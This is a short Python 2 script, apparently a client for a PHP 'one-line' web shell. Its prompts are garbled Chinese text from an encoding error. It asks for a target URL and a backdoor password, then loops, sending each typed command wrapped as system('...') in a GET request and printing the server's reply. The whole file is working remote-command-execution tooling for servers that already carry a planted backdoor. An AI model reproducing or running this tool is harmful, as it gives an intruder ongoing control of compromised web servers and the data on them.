import urllib
import urllib2

print('�������һ�仰��ַ��')

h = "http://"
user_input_url = raw_input("��ʽΪ[IP + XX.php]")
user_input_pwd = raw_input("�������һ�仰���룺")


while 1:
    user_input_cmd = raw_input("����>>>")

    data = {user_input_pwd:"system('" + user_input_cmd + "');"}

    data = urllib.urlencode(data)
    
    requrl = h + user_input_url + "?" + data
    
    req = urllib2.Request(requrl)

    ope = urllib2.urlopen(req)

    print(ope.read())

